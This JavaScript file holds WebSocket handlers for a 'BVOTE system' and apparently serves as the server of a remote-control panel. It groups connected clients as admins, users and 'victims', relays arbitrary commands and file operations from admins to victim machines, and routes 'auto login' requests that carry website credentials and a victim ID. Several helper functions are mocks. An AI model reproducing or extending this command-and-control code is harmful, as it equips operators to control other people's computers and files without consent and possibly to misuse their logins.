/**
 * WebSocket Event Handlers
 * Real-time communication handlers for BVOTE system
 */

import { v4 as uuidv4 } from 'uuid';

class SocketHandlers {
  constructor(io, eventBus, securityManager) {
    this.io = io;
    this.eventBus = eventBus;
    this.securityManager = securityManager;
    
    // Connection tracking
    this.connectedClients = new Map();
    this.adminSockets = new Set();
    this.userSockets = new Set();
    this.victimSockets = new Set();
    
    this.setupEventSubscriptions();
  }

  // Initialize socket connection
  handleConnection(socket) {
    console.log(`🔌 Client connected: ${socket.id}`);
    
    this.connectedClients.set(socket.id, {
      connectedAt: new Date(),
      lastActivity: new Date()
    });

    // Authentication handler
    socket.on('authenticate', (data) => this.handleAuthentication(socket, data));
    
    // Auto Login handlers
    socket.on('auto_login:submit', (data) => this.handleAutoLoginSubmit(socket, data));
    socket.on('auto_login:intervention', (data) => this.handleAutoLoginIntervention(socket, data));
    
    // Victim Control handlers
    socket.on('victim:command', (data) => this.handleVictimCommand(socket, data));
    socket.on('victim:file_operation', (data) => this.handleVictimFileOperation(socket, data));
    
    // Admin handlers
    socket.on('admin:broadcast', (data) => this.handleAdminBroadcast(socket, data));
    socket.on('admin:system_command', (data) => this.handleSystemCommand(socket, data));
    
    // General handlers
    socket.on('ping', () => this.handlePing(socket));
    socket.on('disconnect', () => this.handleDisconnection(socket));
    
    // Activity tracking
    socket.onAny(() => {
      const client = this.connectedClients.get(socket.id);
      if (client) {
        client.lastActivity = new Date();
      }
    });
  }

  // Authentication
  handleAuthentication(socket, data) {
    const { token, clientType, metadata = {} } = data;
    
    try {
      const decoded = this.securityManager.verifyToken(token);
      
      if (!decoded) {
        socket.emit('auth:error', { error: 'Invalid token' });
        return;
      }

      // Update socket info
      socket.userId = decoded.userId;
      socket.userRole = decoded.role;
      socket.clientType = clientType;
      socket.authenticated = true;

      // Update client tracking
      this.connectedClients.set(socket.id, {
        userId: decoded.userId,
        role: decoded.role,
        clientType,
        metadata,
        connectedAt: new Date(),
        lastActivity: new Date()
      });

      // Add to appropriate socket groups
      switch (clientType) {
        case 'admin':
          this.adminSockets.add(socket.id);
          socket.join('admins');
          break;
        case 'victim':
          this.victimSockets.add(socket.id);
          socket.join('victims');
          break;
        default:
          this.userSockets.add(socket.id);
          socket.join('users');
      }

      socket.emit('auth:success', {
        userId: decoded.userId,
        role: decoded.role,
        clientType
      });

      // Publish authentication event
      this.eventBus.publish('socket:authenticated', {
        socketId: socket.id,
        userId: decoded.userId,
        role: decoded.role,
        clientType
      });

      console.log(`✅ Socket authenticated: ${socket.id} (${decoded.userId})`);
      
    } catch (error) {
      console.error('Authentication error:', error);
      socket.emit('auth:error', { error: 'Authentication failed' });
    }
  }

  // Auto Login handlers
  async handleAutoLoginSubmit(socket, data) {
    if (!this.requireAuth(socket)) return;

    try {
      const { website, username, password, victimId } = data;
      
      const requestId = uuidv4();
      const request = {
        id: requestId,
        userId: socket.userId,
        website,
        username,
        victimId,
        status: 'pending',
        createdAt: new Date(),
        steps: [
          { id: 'navigate', name: 'Navigate to website', status: 'pending' },
          { id: 'login', name: 'Enter credentials', status: 'pending' },
          { id: 'verify', name: 'Verify login', status: 'pending' }
        ]
      };

      // Emit to admins for approval
      this.io.to('admins').emit('auto_login:new_request', request);
      
      // Confirm to user
      socket.emit('auto_login:submitted', {
        requestId,
        status: 'pending_approval'
      });

      // Publish event
      await this.eventBus.publish('auto_login:request_submitted', request);
      
    } catch (error) {
      socket.emit('auto_login:error', { error: error.message });
    }
  }

  async handleAutoLoginIntervention(socket, data) {
    if (!this.requireAuth(socket, 'admin')) return;

    try {
      const { requestId, action, interventionData } = data;
      
      // Process intervention
      const result = await this.processIntervention(requestId, action, interventionData);
      
      // Notify relevant parties
      this.io.to('admins').emit('auto_login:intervention_processed', {
        requestId,
        action,
        result
      });

      // Notify user if needed
      if (result.userId) {
        this.notifyUser(result.userId, 'auto_login:update', {
          requestId,
          status: result.status,
          message: result.message
        });
      }

      socket.emit('auto_login:intervention_success', result);
      
    } catch (error) {
      socket.emit('auto_login:intervention_error', { error: error.message });
    }
  }

  // Victim Control handlers
  async handleVictimCommand(socket, data) {
    if (!this.requireAuth(socket, 'admin')) return;

    try {
      const { victimId, command, params = {} } = data;
      const commandId = uuidv4();
      
      const commandData = {
        id: commandId,
        victimId,
        command,
        params,
        adminId: socket.userId,
        timestamp: new Date(),
        status: 'sent'
      };

      // Send command to victim
      this.io.to('victims').emit('victim:execute_command', commandData);
      
      // Confirm to admin
      socket.emit('victim:command_sent', {
        commandId,
        status: 'sent'
      });

      // Publish event
      await this.eventBus.publish('victim:command_sent', commandData);
      
    } catch (error) {
      socket.emit('victim:command_error', { error: error.message });
    }
  }

  async handleVictimFileOperation(socket, data) {
    if (!this.requireAuth(socket, 'admin')) return;

    try {
      const { victimId, operation, path, params = {} } = data;
      const operationId = uuidv4();
      
      const operationData = {
        id: operationId,
        victimId,
        operation,
        path,
        params,
        adminId: socket.userId,
        timestamp: new Date()
      };

      // Send to victim
      this.io.to('victims').emit('victim:file_operation', operationData);
      
      socket.emit('victim:file_operation_sent', {
        operationId,
        status: 'sent'
      });

      await this.eventBus.publish('victim:file_operation_sent', operationData);
      
    } catch (error) {
      socket.emit('victim:file_operation_error', { error: error.message });
    }
  }

  // Admin handlers
  handleAdminBroadcast(socket, data) {
    if (!this.requireAuth(socket, 'admin')) return;

    const { message, target = 'all', priority = 'normal' } = data;
    
    const broadcastData = {
      id: uuidv4(),
      message,
      priority,
      from: socket.userId,
      timestamp: new Date()
    };

    switch (target) {
      case 'admins':
        this.io.to('admins').emit('admin:broadcast_message', broadcastData);
        break;
      case 'users':
        this.io.to('users').emit('user:admin_message', broadcastData);
        break;
      case 'victims':
        this.io.to('victims').emit('victim:admin_message', broadcastData);
        break;
      default:
        this.io.emit('system:broadcast', broadcastData);
    }

    socket.emit('admin:broadcast_sent', { success: true });
  }

  async handleSystemCommand(socket, data) {
    if (!this.requireAuth(socket, 'admin')) return;

    try {
      const { command, params = {} } = data;
      
      let result;
      switch (command) {
        case 'get_system_stats':
          result = await this.getSystemStats();
          break;
        case 'restart_service':
          result = await this.restartService(params.service);
          break;
        case 'clear_cache':
          result = await this.clearCache();
          break;
        default:
          throw new Error(`Unknown system command: ${command}`);
      }

      socket.emit('admin:system_command_result', {
        command,
        result,
        success: true
      });
      
    } catch (error) {
      socket.emit('admin:system_command_error', {
        command: data.command,
        error: error.message
      });
    }
  }

  // General handlers
  handlePing(socket) {
    socket.emit('pong', { timestamp: new Date() });
  }

  handleDisconnection(socket) {
    console.log(`🔌 Client disconnected: ${socket.id}`);
    
    // Remove from tracking
    this.connectedClients.delete(socket.id);
    this.adminSockets.delete(socket.id);
    this.userSockets.delete(socket.id);
    this.victimSockets.delete(socket.id);

    // Publish disconnection event
    this.eventBus.publish('socket:disconnected', {
      socketId: socket.id,
      timestamp: new Date()
    });
  }

  // Setup event subscriptions from EventBus
  setupEventSubscriptions() {
    // Auto Login events
    this.eventBus.subscribe('auto_login:status_update', (event) => {
      this.io.to('admins').emit('auto_login:status_update', event.data);
      
      if (event.data.userId) {
        this.notifyUser(event.data.userId, 'auto_login:status_update', event.data);
      }
    });

    this.eventBus.subscribe('auto_login:completed', (event) => {
      this.io.to('admins').emit('auto_login:completed', event.data);
      
      if (event.data.userId) {
        this.notifyUser(event.data.userId, 'auto_login:completed', event.data);
      }
    });

    // Victim events
    this.eventBus.subscribe('victim:status_change', (event) => {
      this.io.to('admins').emit('victim:status_change', event.data);
    });

    this.eventBus.subscribe('victim:command_result', (event) => {
      this.io.to('admins').emit('victim:command_result', event.data);
    });

    // System events
    this.eventBus.subscribe('system:alert', (event) => {
      this.io.to('admins').emit('system:alert', event.data);
    });

    this.eventBus.subscribe('system:stats_update', (event) => {
      this.io.to('admins').emit('system:stats_update', event.data);
    });
  }

  // Utility methods
  requireAuth(socket, requiredRole = null) {
    if (!socket.authenticated) {
      socket.emit('error', { message: 'Authentication required' });
      return false;
    }

    if (requiredRole && socket.userRole !== requiredRole && socket.userRole !== 'SuperAdmin') {
      socket.emit('error', { message: 'Insufficient permissions' });
      return false;
    }

    return true;
  }

  notifyUser(userId, event, data) {
    this.connectedClients.forEach((client, socketId) => {
      if (client.userId === userId) {
        this.io.to(socketId).emit(event, data);
      }
    });
  }

  async processIntervention(requestId, action, data) {
    // Mock intervention processing
    return {
      requestId,
      action,
      status: 'processed',
      message: `Intervention ${action} completed successfully`,
      timestamp: new Date()
    };
  }

  async getSystemStats() {
    return {
      uptime: process.uptime(),
      memory: process.memoryUsage(),
      connections: {
        total: this.connectedClients.size,
        admins: this.adminSockets.size,
        users: this.userSockets.size,
        victims: this.victimSockets.size
      },
      timestamp: new Date()
    };
  }

  async restartService(serviceName) {
    // Mock service restart
    return {
      service: serviceName,
      status: 'restarted',
      timestamp: new Date()
    };
  }

  async clearCache() {
    // Mock cache clearing
    return {
      status: 'cleared',
      timestamp: new Date()
    };
  }

  // Get connection statistics
  getConnectionStats() {
    return {
      total: this.connectedClients.size,
      admins: this.adminSockets.size,
      users: this.userSockets.size,
      victims: this.victimSockets.size,
      clients: Array.from(this.connectedClients.entries()).map(([socketId, client]) => ({
        socketId,
        ...client
      }))
    };
  }
}

export default SocketHandlers;
